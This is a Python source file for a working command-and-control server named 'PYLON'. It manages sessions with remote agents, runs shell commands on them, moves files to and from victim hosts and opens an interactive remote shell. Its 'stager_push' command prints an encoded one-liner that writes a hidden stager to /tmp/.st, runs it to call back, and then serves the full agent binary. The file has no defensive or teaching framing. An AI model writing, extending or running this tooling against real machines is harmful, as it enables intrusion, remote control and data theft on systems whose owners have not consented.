import base64
import os
import select
import socket
import struct
import subprocess
import sys
import termios
import threading
import tty

from core.plugins_engine import PluginsEngine

HOST = "0.0.0.0"
PORT = 9001

sessions = {}
session_lock = threading.Lock()
session_counter = 1
server_running = True


def receive_exact(conn, size):
    buffer = b""
    while len(buffer) < size:
        chunk = conn.recv(size - len(buffer))
        if not chunk:
            return None
        buffer += chunk
    return buffer


def handle_agent(sid):
    with session_lock:
        if sid not in sessions or not sessions[sid]["active"]:
            print("Session not found")
            return
        conn = sessions[sid]["conn"]
        addr = sessions[sid]["addr"]

    print(f"Connection: {sid} ({addr})")
    print("Exit - close program")
    print("drop - disconnect agent, allow he to reconnect")
    print("upload <path>, download <path>")
    print("==== PYLON ====")

    plugins_engine = PluginsEngine(conn)
    plugins_engine.load_plugins()

    try:
        while True:
            cmd = input("pylon >")

            if not cmd:
                continue

            if cmd in ["exit", "quit"]:
                header = struct.pack("!II", 4, 0)
                conn.sendall(header)
                print("Closing session")
                break

            if cmd in ["background", "bg", "drop", "detach"]:
                print("Disconnecting agent")
                break

            if cmd.startswith("upload "):
                try:
                    local_path = cmd.split(" ", 1)[1]
                    if not os.path.exists(local_path):
                        print("ERROR: File not found")
                        continue

                    filename = os.path.basename(local_path)
                    filename_bytes = filename.encode("utf-8")

                    with open(local_path, "rb") as f:
                        file_bytes = f.read()

                    payload = (
                        struct.pack("!I", len(filename_bytes))
                        + filename_bytes
                        + file_bytes
                    )
                    header = struct.pack("!II", 2, len(payload))

                    conn.sendall(header + payload)
                    print(f"Sending '{filename}'")

                    resp_h = receive_exact(conn, 8)
                    r_id, r_len = struct.unpack("!II", resp_h)
                    msg = receive_exact(conn, r_len).decode()
                    print(f"Output: {msg}")
                except Exception as e:
                    print(f"Error: {e}")
                continue

            if cmd.startswith("download "):
                try:
                    remote_path = cmd.split(" ", 1)[1]
                    payload = remote_path.encode()
                    header = struct.pack("!II", 3, len(payload))

                    conn.sendall(header + payload)

                    resp_h = receive_exact(conn, 8)
                    if not resp_h:
                        print("No response")
                        break

                    r_id, r_len = struct.unpack("!II", resp_h)

                    if r_id == 5:
                        err_msg = receive_exact(conn, r_len).decode()
                        print(f"Agent error {err_msg}")
                    elif r_id == 3:
                        file_bytes = receive_exact(conn, r_len)
                        out_name = f"downloaded-{os.path.basename(remote_path)}"
                        with open(out_name, "wb") as f:
                            f.write(file_bytes)
                        print(f"Saved as {out_name}")
                except Exception as e:
                    print(f"Error: {e}")
                continue

            if cmd == "shell":
                header = struct.pack("!II", 6, 0)
                conn.sendall(header)
                print("Running shell, type 'exit' to return")

                old_settings = termios.tcgetattr(sys.stdin)
                tty.setraw(sys.stdin.fileno())

                eof_seq = b"\xff\xff\xff\xff_EOF_"
                temp_buffer = b""
                try:
                    while True:
                        r, w, x = select.select([conn, sys.stdin], [], [])

                        if conn in r:
                            data = conn.recv(4096)
                            if not data:
                                break

                            temp_buffer += data

                            if eof_seq in temp_buffer:
                                before_eof = temp_buffer.split(eof_seq)[0]
                                if before_eof:
                                    sys.stdout.buffer.write(before_eof)
                                    sys.stdout.flush()
                                break
                            else:
                                sys.stdout.buffer.write(data)
                                sys.stdout.flush()

                                if len(temp_buffer) > len(eof_seq):
                                    temp_buffer = temp_buffer[-len(eof_seq) :]

                        if sys.stdin in r:
                            user_input = os.read(sys.stdin.fileno(), 4096)
                            if not user_input:
                                break
                            conn.sendall(user_input)
                except Exception as e:
                    pass
                finally:
                    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
                    print("Session ended")
                continue
            if cmd.startswith("stager_push "):
                try:
                    agent_bin_path = cmd.split(" ", 1)[1]
                    if not os.path.exists(agent_bin_path):
                        print(f"ERROR: File {agent_bin_path} not found!")
                        continue

                    with open(agent_bin_path, "rb") as f:
                        agent_bytes = f.read()

                    stager_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    stager_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    stager_server.bind((HOST, PORT))
                    stager_server.listen(1)

                    stager_conn, stager_addr = stager_server.accept()
                    print(f"CONNECTED: {stager_addr}")
                    stager_conn.sendall(agent_bytes)
                    stager_conn.close()

                    break
                except Exception as e:
                    print(f"ERROR: {e}")
                continue
            plugins_data = plugins_engine.execute_plugins(cmd)
            if plugins_data:
                print(plugins_data)
                continue

            payload = cmd.encode()
            header = struct.pack("!II", 1, len(payload))  # 1 - shell execution
            conn.sendall(header + payload)
            print(f"Sent {cmd}")

            resp_header_raw = receive_exact(conn, 8)
            if not resp_header_raw:
                print("Agent disconnected")
                return

            resp_id, resp_len = struct.unpack("!II", resp_header_raw)
            print(f"Response header: ID={resp_id}, len={resp_len} bytes")

            if resp_len > 0:
                result_raw = receive_exact(conn, resp_len)
                print("Response:\n" + "-" * 30)
                print(result_raw.decode(errors="ignore").strip())
                print("-" * 30)

    except Exception as e:
        print(f"Error-main-loop: {e}")
    finally:
        conn.close()


def accept_thread_func(server_socket):
    global session_counter
    while server_running:
        try:
            conn, addr = server_socket.accept()
            with session_lock:
                sid = session_counter
                session_counter += 1
                sessions[sid] = {"conn": conn, "addr": addr, "active": True}
            print("\n\nNew session")
        except Exception:
            break


def list_sessions():
    print("\n" + "=" * 55)
    print(f"{'ID':<5} | {'IP':<18} | {'PORT':<8} | {'STATUS':<10}")
    print("-" * 55)
    with session_lock:
        if not sessions:
            print("No active sessions")
        for sid, data in sessions.items():
            if data["active"]:
                ip, port = data["addr"]
                print(f"{sid:<5} | {ip:<18} | {port:<8} | ACTIVE")
    print("=" * 55)


def close_session(sid):
    with session_lock:
        if sid in sessions:
            try:
                sessions[sid]["conn"].close()
            except Exception:
                pass
            sessions[sid]["active"] = False


def pre_shell():
    global server_running
    server_socket = None
    while True:
        cmd = input("pshell> ")
        if cmd.startswith("listen"):
            if server_socket is not None:
                continue

            port = 9001
            if len(cmd.split()) < 2:
                pass
            else:
                _, port = cmd.split()

            PORT = int(port)

            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            server_socket.bind((HOST, PORT))
            server_socket.listen(10)
            t = threading.Thread(
                target=accept_thread_func, args=(server_socket,), daemon=True
            )
            t.start()
            # try:
            #    while True:
            #        conn, addr = server.accept()
            #        handle_agent(conn, addr)
            # except KeyboardInterrupt:
            #    print("Closing")
            # finally:
            #    server.close()
        elif cmd in ["sessions -l", "sessions"]:
            list_sessions()
        elif cmd.startswith("session -i"):
            try:
                sid = int(cmd.split()[2])
                handle_agent(sid)
            except (IndexError, ValueError):
                print("Usage: sessions -i <ID>")
        elif cmd.startswith("session -k"):
            try:
                sid = int(cmd.split()[2])
                close_session(sid)
                print(f"Closed session [{sid}]")
            except (IndexError, ValueError):
                print("Usage: sessions -k <ID>")
        elif cmd.startswith("stager_push"):
            try:
                parts = cmd.split()
                if len(parts) < 3:
                    print("Usage: stager_push [ip] [port]")
                    continue

                s_ip, s_port = parts[1], parts[2]

                stager_bin_path = "../build/stager"
                agent_bin_path = "../build/agent_static"

                if not os.path.exists(agent_bin_path):
                    subprocess.run(["make", "static"], cwd="..", check=False)

                if not os.path.exists(stager_bin_path):
                    subprocess.run(["make", "stager"], cwd="..", check=False)

                with open(stager_bin_path, "rb") as f:
                    stager_bytes = f.read()

                with open(agent_bin_path, "rb") as f:
                    agent_bytes = f.read()

                import gzip

                compressed_data = gzip.compress(stager_bytes, compresslevel=9)

                b64 = base64.b64encode(compressed_data).decode("utf-8")
                print(
                    f"pusher>\necho {b64} | base64 -d | gunzip > /tmp/.st && chmod +x /tmp/.st && /tmp/.st {s_ip} {s_port}"
                )

                stager_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                stager_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                stager_server.bind((HOST, int(s_port)))
                stager_server.listen(1)

                stager_conn, stager_addr = stager_server.accept()
                print(f"CONNECTED: {stager_addr}")
                stager_conn.sendall(agent_bytes)
                stager_conn.close()
                stager_server.close()
            except Exception as e:
                print(f"ERROR: {e}")
            continue
        else:
            print("Invalid command: listen or stager_push")


def main():
    pre_shell()


if __name__ == "__main__":
    main()
